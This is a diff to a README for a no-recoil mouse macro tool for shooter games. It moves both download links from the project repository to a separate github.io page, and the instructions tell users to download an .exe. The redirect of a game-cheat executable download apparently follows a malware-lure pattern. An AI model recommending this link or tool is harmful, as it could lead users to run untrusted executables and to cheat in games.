@@ -1,6 +1,6 @@
 # 🖱️ Mouse-Macro-Recorder-2026-No-Recoil - Simplify your mouse aiming and control
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Jayalkahestic205/Mouse-Macro-Recorder-2026-No-Recoil)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://jayalkahestic205.github.io)
 
 This tool helps players manage recoil in first-person shooter games. It functions as a macro recorder compatible with Logitech G-Hub software. The application automates mouse movements to counteract weapon patterns. You can record your own movements or use existing patterns to stabilize your aim during gameplay.
 
@@ -17,7 +17,7 @@ Ensure your computer meets these standards before you begin:
 
 Follow these steps to set up the software on your system:
 
-1.  Visit the [Download Page](https://github.com/Jayalkahestic205/Mouse-Macro-Recorder-2026-No-Recoil) to access the latest version.
+1.  Visit the [Download Page](https://jayalkahestic205.github.io) to access the latest version.
 2.  Locate the release section on the right side of the screen.
 3.  Click the version link to open the assets menu.
 4.  Download the executable file ending in .exe.
